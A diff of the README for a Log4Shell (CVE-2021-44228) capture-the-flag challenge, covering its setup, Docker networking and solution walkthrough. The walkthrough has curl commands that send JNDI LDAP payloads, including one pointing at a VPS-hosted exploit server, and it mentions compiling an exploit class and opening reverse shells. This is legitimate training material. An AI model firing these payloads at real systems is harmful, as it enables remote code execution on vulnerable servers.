@@ -1,18 +1,17 @@
 # Escape The Matrix - CTF Challenge
 
-## 🎯 Overview
+## Overview
 A web exploitation challenge combining sequential UI puzzle-solving with a hidden Log4Shell (CVE-2021-44228) RCE vulnerability. Navigate through the Matrix, collect fragments, and exploit the void.
 
-## 📋 Challenge Description
+## Challenge Description
 **Category:** Web Exploitation  
 **Difficulty:** Medium-Hard  
-**Points:** 300
 
 Players navigate a Matrix-themed sequential puzzle UI, collecting base64 fragments from HTTP headers. After completing the sequence, they must discover and exploit a hidden Log4j RCE endpoint to capture the final flag.
 
 ---
 
-## 🏗️ Architecture
+## Architecture
 
 ### Tech Stack
 - **Frontend:** React 19 + Vite 6.0
@@ -31,7 +30,7 @@ Frontend (Port 5173) → Backend (Port 8080) → GIF Assets
 
 ---
 
-## 🚀 Quick Start
+## Quick Start
 
 ### Prerequisites
 - **Docker** (for deployment)
@@ -47,9 +46,21 @@ docker build -t escape-the-matrix .
 # Run the container
 docker run -p 8080:8080 escape-the-matrix
 
-# Access the challenge
-open http://localhost:8080
-```
+#Proper Deployement (Immune to Garbage HTTP methods,Random scanners, Invalid ,JSON TLS-on-HTTP ,noise,Reboots,JVM OOM crashes)
+docker run \
+  --name escape-the-matrix \
+  --restart unless-stopped \
+  -p 8080:8080 \
+  --memory=768m \
+  --cpus=1.0 \
+  --pids-limit=256 \
+  --ulimit nofile=65535:65535 \
+  --health-cmd="curl -fs http://localhost:8080/ || exit 1" \
+  --health-interval=30s \
+  --health-timeout=5s \
+  --health-retries=3 \
+  escape-the-matrix
+
 
 ### Local Development (Without Docker)
 
@@ -70,7 +81,7 @@ npm run dev
 
 ---
 
-## 🎮 Player Journey
+## Player Journey
 
 ### Phase 1: Sequential Puzzle (Web UI)
 1. Access the web interface at `http://localhost:8080`
@@ -112,7 +123,7 @@ Content-Type: application/json
 
 ---
 
-## 🔍 Solution Walkthrough
+## Solution Walkthrough
 
 ### Step 1: Automated Fragment Collection
 Use the web UI or script to collect all fragments:
@@ -200,7 +211,7 @@ public class Exploit {
 
 **Compile with Java 8:**
 ```bash
-javac Exploit.java
+javac Exploit.java -source 8 -target 8
 ```
 
 #### 2.3 Host the Exploit
@@ -231,7 +242,7 @@ curl -X POST http://localhost:8080/api/m4tr1x_Esc4p3d/enT3r_th3_v0iD \
 
 ---
 
-## 🐳 Docker Networking for Exploitation
+## Docker Networking for Exploitation
 
 When running the challenge in Docker and exploiting from the host:
 
@@ -242,29 +253,8 @@ curl -X POST http://localhost:8080/api/m4tr1x_Esc4p3d/enT3r_th3_v0iD \
   -d '{"v0id": "${jndi:ldap://host.docker.internal:1389/Exploit}"}'
 ```
 
-### Option 2: Host Network Mode (Linux)
-```bash
-# Run container in host network mode
-docker run --network=host escape-the-matrix
 
-# Exploit using localhost
-curl -X POST http://localhost:8080/api/m4tr1x_Esc4p3d/enT3r_th3_v0iD \
-  -H "Content-Type: application/json" \
-  -d '{"v0id": "${jndi:ldap://127.0.0.1:1389/Exploit}"}'
-```
-
-### Option 3: Bridge Network with Host IP (All Platforms)
-```bash
-# Find Docker bridge IP
-ip addr show docker0  # Usually 172.17.0.1
-
-# Use host IP in payload
-curl -X POST http://localhost:8080/api/m4tr1x_Esc4p3d/enT3r_th3_v0iD \
-  -H "Content-Type: application/json" \
-  -d '{"v0id": "${jndi:ldap://172.17.0.1:1389/Exploit}"}'
-```
-
-### Option 4: Remote VPS (Recommended for CTF)
+### Option 2: Remote VPS (Recommended for CTF)
 ```bash
 # Deploy LDAP + HTTP servers on a public VPS
 # Use public IP in JNDI string
@@ -273,9 +263,13 @@ curl -X POST http://localhost:8080/api/m4tr1x_Esc4p3d/enT3r_th3_v0iD \
   -d '{"v0id": "${jndi:ldap://YOUR_VPS_IP:1389/Exploit}"}'
 ```
 
+### Option 3: Using a VPN tunnel 
+The player connects with an openvpn tunnel given there own private ovpn (thm box) he can establish a communication to the public ip of the chall  
+//to be reviewed in infra
+
 ---
 
-## 📁 Project Structure
+## Project Structure
 
 ```
 /
@@ -326,7 +320,7 @@ curl -X POST http://localhost:8080/api/m4tr1x_Esc4p3d/enT3r_th3_v0iD \
 
 ---
 
-## 🔐 Security Implementation Details
+## Security Implementation Details
 
 ### What's Vulnerable
 - **Log4j 2.14.1** in `pom.xml` (CVE-2021-44228)
@@ -351,7 +345,7 @@ logger.info("Session {} is still in cooldown", sessionId);
 
 ---
 
-## 🛠️ Development & Testing
+## Development & Testing
 
 ### Run Backend Tests
 ```bash
@@ -395,13 +389,13 @@ docker logs <container_id> 2>&1 | grep -i jndi
 ## 🎓 Learning Objectives
 
 ### Technical Skills
-- ✅ **HTTP Header Analysis:** Extract data from custom headers
-- ✅ **Base64 Encoding:** Decode fragmented messages
-- ✅ **API Reconnaissance:** Discover hidden endpoints
-- ✅ **Log4Shell Exploitation:** Understand CVE-2021-44228
-- ✅ **JNDI Injection:** Master Java deserialization attacks
-- ✅ **Docker Networking:** Navigate container-to-host communication
-- ✅ **Reverse Shells:** Establish command & control channels
+- **HTTP Header Analysis:** Extract data from custom headers
+-  **Base64 Encoding:** Decode fragmented messages
+-  **API Reconnaissance:** Discover hidden endpoints
+-  **Log4Shell Exploitation:** Understand CVE-2021-44228
+-  **JNDI Injection:** Master Java deserialization attacks
+-  **Docker Networking:** Navigate container-to-host communication
+-  **Reverse Shells:** Establish command & control channels
 
 ### CTF Concepts
 - Sequential challenges with rate limiting
@@ -411,15 +405,13 @@ docker logs <container_id> 2>&1 | grep -i jndi
 
 ---
 
-## 🚨 For CTF Organizers
+##  For CTF 
 
 ### Deployment Checklist
-- [ ] Change `flag.txt` to your custom flag
 - [ ] Deploy on isolated network (no production access)
 - [ ] Monitor logs for exploitation attempts
 - [ ] Consider adding firewall rules for LDAP egress
 - [ ] Set up backup server if high traffic expected
-- [ ] Document intended solution for judges
 
 ### Security Considerations
 ⚠️ **WARNING:** This application is intentionally vulnerable!
@@ -429,11 +421,6 @@ docker logs <container_id> 2>&1 | grep -i jndi
 - **Monitor** for unintended exploitation vectors
 - **Rate limit** at infrastructure level if needed
 - **Log** all exploitation attempts for learning
-
-### Scoring Suggestions
-- **100 points:** Discover hidden endpoint
-- **100 points:** Successfully trigger JNDI lookup
-- **100 points:** Retrieve the flag via RCE
 
 ---
 
@@ -456,7 +443,7 @@ docker logs <container_id> 2>&1 | grep -i jndi
 
 ---
 
-## 🐛 Troubleshooting
+## Troubleshooting
 
 ### Issue: "No fragments in response"
 **Solution:** Ensure backend is running and CORS is configured correctly.
@@ -475,24 +462,23 @@ docker logs <container_id> 2>&1 | grep -i jndi
 
 ---
 
-## 📜 License
+## License
 MIT License - **For educational and CTF purposes only.**
 
 **Disclaimer:** This software contains intentional security vulnerabilities. Use only in controlled, isolated environments for authorized security training and CTF events.
 
 ---
 
-## 🙏 Credits & Acknowledgments
+## Credits & Acknowledgments
 - **Vulnerability:** CVE-2021-44228 (Log4Shell) discovered by Chen Zhaojun of Alibaba Cloud Security Team
 - **Theme:** Inspired by *The Matrix* franchise
 - **Framework:** Spring Boot, React, Vite
-- **Built for:** NorthSec CTF 2024
-- **Author:** [Your Name/Team]
+- **Built for:** NorthSec CTF 2026
+- **Author:** Azzaoui Mohamed Omar
 - **Version:** 1.0.0
 
 ---
 
-**🚩 Flag Format:** `flag{...}`  
-**💬 Questions?** Check `server/CTF-CHALLENGE-GUIDE.md` for detailed setup instructions.
+**Flag Format:** `NSC{...}`  
 
-**Good luck, and remember: there is no spoon. 🥄**
+
